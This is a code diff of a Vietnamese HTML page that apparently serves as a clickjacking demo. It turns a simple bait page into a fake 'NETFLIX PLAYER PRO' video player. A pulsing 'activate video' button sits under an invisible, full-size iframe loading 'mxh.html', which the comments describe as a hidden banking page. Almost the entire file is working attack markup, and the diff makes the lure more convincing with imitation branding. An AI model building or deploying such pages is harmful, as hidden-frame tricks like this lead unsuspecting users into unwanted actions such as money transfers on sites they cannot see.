@@ -2,28 +2,63 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <title>Xem Video Giải Trí Miễn Phí</title>
+    <title>Nền Tảng Xem Phim Trực Tuyến Chất Lượng Cao</title>
     <style>
-        body { font-family: sans-serif; background-color: #1a1a1a; color: white; text-align: center; margin-top: 80px; }
-        .clickjacking-box { position: relative; width: 320px; height: 180px; margin: 40px auto; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #0c0c0e; color: #ffffff; text-align: center; margin: 0; padding: 0; }
+        .navbar { background-color: #14141b; padding: 15px; font-size: 18px; font-weight: bold; color: #e50914; text-align: left; padding-left: 5%; box-shadow: 0 2px 10px rgba(0,0,0,0.5); }
         
-        /* LỚP NỀN: Nút xem video mồi nhử */
-        .btn-video-bait { position: absolute; top: 30px; left: 10px; width: 280px; height: 50px; background-color: #ff3333; color: white; font-size: 16px; font-weight: bold; border: none; border-radius: 6px; z-index: 1; cursor: pointer; }
+        .main-content { max-width: 800px; margin: 40px auto; padding: 0 20px; }
+        .video-title { font-size: 24px; font-weight: 600; margin-bottom: 20px; color: #f5f5f7; text-align: left; }
+        
+        /* Trình phát video giả lập chuyên nghiệp */
+        .video-player-mock { position: relative; width: 100%; max-width: 640px; height: 360px; background-color: #000000; border-radius: 8px; overflow: hidden; margin: 0 auto; box-shadow: 0 10px 30px rgba(0,0,0,0.7); border: 1px solid #232329; }
+        .video-thumbnail { width: 100%; height: 100%; object-fit: cover; filter: brightness(0.6); }
+        
+        /* Các thành phần điều khiển của trình phát (Controls) */
+        .player-controls { position: absolute; bottom: 0; left: 0; width: 100%; height: 50px; background: linear-gradient(transparent, rgba(0,0,0,0.9)); display: flex; align-items: center; padding: 0 15px; box-sizing: border-box; }
+        .play-bar { flex-grow: 1; height: 4px; background: rgba(255,255,255,0.3); margin: 0 15px; border-radius: 2px; position: relative; }
+        .play-progress { width: 35%; height: 100%; background: #e50914; border-radius: 2px; }
+        .control-icon { width: 16px; height: 16px; border-style: solid; border-width: 8px 0 8px 16px; border-color: transparent transparent transparent #ffffff; cursor: pointer; }
 
-        /* LỚP PHỦ: Iframe chứa trang chuyển tiền nằm đè lên trên */
+        /* VÙNG KHÔNG GIAN ĐẶT BẪY CLICKJACKING */
+        .jacking-container { position: absolute; width: 350px; height: 180px; top: 90px; left: 145px; /* Căn giữa màn hình player */ }
+        
+        /* LỚP NỀN: Nút giả lập thông báo bắt buộc của trình phát phim */
+        .btn-player-bait { position: absolute; top: 120px; left: 35px; width: 280px; height: 45px; background-color: #e50914; color: white; font-size: 14px; font-weight: bold; border: none; border-radius: 6px; z-index: 1; cursor: pointer; box-shadow: 0 4px 12px rgba(229,9,20,0.4); animation: pulse 2s infinite; text-transform: uppercase; }
+
+        /* LỚP PHỦ: Iframe chứa trang ngân hàng tàng hình */
         .iframe-target { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: 2;
-            opacity: 0; /* Đặt bằng 0 để tàng hình hoàn toàn khi thử nghiệm */
+            opacity: 0; /* Đặt opacity bằng 0 để tàng hình hoàn toàn */
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.03); }
+            100% { transform: scale(1); }
         }
     </style>
 </head>
 <body>
 
-    <h1>HỆ THỐNG PHÁT VIDEO CHẤT LƯỢNG CAO</h1>
-    <p>Bấm vào nút bên dưới để tải và xem đoạn video đang xu hướng.</p>
+    <div class="navbar">NETFLIX PLAYER PRO</div>
     
-    <div class="clickjacking-box">
-        <button class="btn-video-bait">XEM VIDEO HOT TẠI ĐÂY</button>
-        <iframe class="iframe-target" src="mxh.html"></iframe>
+    <div class="main-content">
+        <div class="video-title">Bom Tấn Hành Động Kịch Tính 2026 - Bản Đầy Đủ [HD]</div>
+        
+        <div class="video-player-mock">
+            <img class="video-thumbnail" src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?w=800" alt="Video Thumbnail">
+            
+            <div class="jacking-container">
+                <button class="btn-player-bait">KÍCH HOẠT XEM VIDEO</button>
+                <iframe class="iframe-target" src="mxh.html"></iframe>
+            </div>
+            
+            <div class="player-controls">
+                <div class="control-icon"></div>
+                <div class="play-bar"><div class="play-progress"></div></div>
+                <span style="font-size: 12px; color: #aaa;">02:15 / 12:40</span>
+            </div>
+        </div>
     </div>
 
 </body>
